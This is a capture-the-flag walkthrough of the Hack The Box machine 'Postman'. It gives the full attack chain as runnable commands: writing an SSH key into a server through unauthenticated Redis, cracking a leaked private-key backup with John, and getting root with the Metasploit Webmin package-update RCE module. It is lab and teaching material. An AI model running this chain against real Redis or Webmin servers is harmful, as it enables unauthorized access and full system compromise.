### **Summary**

After doing the recon you will see that there are **4 ports** opened on the machine ,

**SSH** on port **22** , 

Port **80** running a static website, 

Port **10000** running **Webmin** v1.910 which has an Authenticated RCE vulnerability,

**Redis** on port **6379.**

Redis has Unauthorized Access Vulnerability which allows anyone to login/interact with it anonymously, allowing us to add our SSH key to the authorized_keys of Redis user.

SSHing into the server as Redis we found there is a user called **Matt** and a backup of his **private RSA key** after cracking it we get a password of **Matt** user. Notice that the Webmin server is running as **root**, Using the authenticated RCE vulnerability along with Matt credentials gives us a root shell.

### Reconnaissance

First we fire Nmap against the machine IP, doing a full-port TCP scan and service, OS detection then saving the output to a file *full-scan*

PS: Doing a full-port scan takes more time than normal scan does, but ensures that you don't miss anything.

    nmap -p- -A -T 4 -v -oA full-scan 10.10.10.160

From the output, we extracted some information.

1. The host is running on **Linux**.
2. 4 ports are opened **22**,**80**,**6379**,**10000.**
3. ports **80** &**10000** are web based.
4. Redis is running on port **6379.**

I always start with web based ports.

### Scanning.

Port 10000 is running **Webmin v1.910** so let's search if it has public vulnerabilities.

    searchsploit Webmin 1.910

![/images/Postman/searchsploit.png](/images/Postman/searchsploit.png)

There is a Remote Command Execution Vulnerability and has a Metasploit module for it. Let's check the module code for further information.

    searchsploit -x exploits/linux/remote/46984.rb

![/images/Postman/rce.png](/images/Postman/rce.png)

Reading the vulnerability, a **username & password** is required. the vulnerability requires authentication so we can't get really much out of it now. Maybe later?.

**Exploring the website**

![/images/Postman/port10000-web.png](/images/Postman/port10000-web.png)

the Webmin SSL mode is enabled in the webmin config file, so we should navigate the website using HTTPS 

![/images/Postman/https.png](/images/Postman/https.png)

Since we are doing HTB, Brute forcing credentials won't give you anything good. **You should try brute forcing credentials if you are doing a real world assessment.**

Nothing more we can do here, let's test for port **80**

**Scanning Port 80**

Port 80 main page:

![/images/Postman/port-80-main.png](/images/Postman/port-80-main.png)

Nothing Important we can use from the main page, the website seems to be a static (*has no functions*) website. It is gobuster time!

We start brute forcing directories/files on the webserver to see if there are any hidden gems.

    gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [http://10.10.10.160:80/](http://10.10.10.160/) -t 20

Leaving it running we start scanning **redis** on port **6379**

**What the heck is Redis?**

*Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps, hyperloglogs, geospatial indexes with radius queries and streams.* ([source](https://github.com/antirez/redis))

Still confused ? Consider Redis as a Database server which you can Interact with using commands sent via TCP. or not :) 

**Scanning Redis**

Redis can be configured to be accessible **anonymously**. In this case you won't need to use any **username** or **password.**

first we install redis-tools to communicate with redis.

    sudo apt-get install redis-tools

then try to connect to redis anonymously

    redis-cli -h 10.10.10.160

![/images/Postman/redis.png](/images/Postman/redis.png)

We established a connection successfully and executed **info** command , the command will list so much information about the server.

### Gaining Access

Now the fun part, since we can execute commands on the server we will  generate an SSH  key on our machine and try to add it to the authorized_key on the victim machine so we can SSHing without password using a valid username 

but first, we need to know:

- a valid **username** on the machine.
- the path of .**ssh** folder on the victim machine.

we can navigate the machine  using those redis commands 

- `config get dir`  it prints the current working directory == pwd
- `config set dir <path_to_directory>` change the working directory to <path> == cd </folder>

executing

    config get dir 

![/images/Postman/ssh-folder.png](/images/Postman/ssh-folder.png)

Well that is great we are on .**ssh** **folder** by **default** and we assume that the **username** is **redis**

### Exploition

    on our machine 
    1- ssh-keygen -t rsa
    2- (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt 
    3- cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit

![/images/Postman/added-key.png](/images/Postman/added-key.png)

now we added our SSH pub  to a key called crackit , we then should add the **crackit key** value to **authorized_key** file on the server

    redis-cli -h 10.10.10.160
    10.10.10.16:6379>> config set dbfilename "authorized_keys"
    10.10.10.16:6379>> save 
    
    on our machine 
    
    ssh -i id_rsa redis@10.10.10.160

![/images/Postman/login-user.png](/images/Postman/login-user.png)


there is another user on the box called **Matt**

### Elevate privileges

1- **From redis to Matt**

Since we don't have a password for the **redis** user, we go to enumeration. 

Uploaded [LinEnum.sh](http://linenum.sh) to the box.

    redis@Postman>> cd /tmp
    redis@Postman>> wget http://10.10.14.5:8000/LinEnum.sh
    redis@Postman>> chmod +x LinEnum.sh  #to make the script executable
    redis@Postman>> ./LinEnum.sh
    

From the output we see that there is a backup of **RSA** key left at /**opt**/ folder

![/images/Postman/id_rsa.bak.png](/images/Postman/id_rsa.bak.png)

![/images/Postman/id.png](/images/Postman/id.png)

Copy the RSA to our machine to start craking it. we will use **John** to crack the has but first we need to transfer the key to john format.

I use [sshng2john](https://github.com/truongkma/ctf-tools/blob/master/John/run/sshng2john.py) instead of the one shipped with john.

    python [ssh2john.py](http://ssh2john.py/) id_bak | tee id_bak.hash

![/images/Postman/sshn2joh.png](/images/Postman/sshn2joh.png)

**DON'T FORGET :** open the file, **delete** the number in the first line in my case it is **24**

start cracking the hash

    john --format=SSH --wordlist=/usr/share/wordlists/rockyou.txt id_bak.hash

![/images/Postman/cracker.png](/images/Postman/cracker.png)

The passphrase is : **computer2008**

if we tried  SSHing using the private key and passphrase we fail.

![/images/Postman/ssh_fail.png](/images/Postman/ssh_fail.png)

maybe the passphrase is also a **Matt** password ?

![/images/Postman/matt.png](/images/Postman/matt.png)

And we are in ! here is **User** **flag** 

![/images/Postman/matt-flag.png](/images/Postman/matt-flag.png)

2- **Elevate priv from Matt to Root**

After some basic enumeration we see that root user owns the webmin directory, that means the webmin server is running as **root** 

Remember the webmin CVE that requires authentication? we now have credentials so let's try exploiting it with **Matt** credentials.

The vulnerability has a **metasploit** module so let's try it.

     msfconsole
    msf5 > search webmin
    msf5 > use exploit/linux/http/webmin_packageup_rce
    msf5 > options

Here is the options of the module 

![/images/Postman/metasploit.png](/images/Postman/metasploit.png)

Fill the options like this 

![/images/Postman/options.png](/images/Postman/options.png)

when you run the module, it fails why ? Remember that the webmin ssl is enabled ? so we must set **SSL to true** in the module options 

    msf5 > set SSL true 
    msf> run

Now the module works! and we got a root shell :)  here is the root flag.

![/images/Postman/root.png](/images/Postman/root.png)
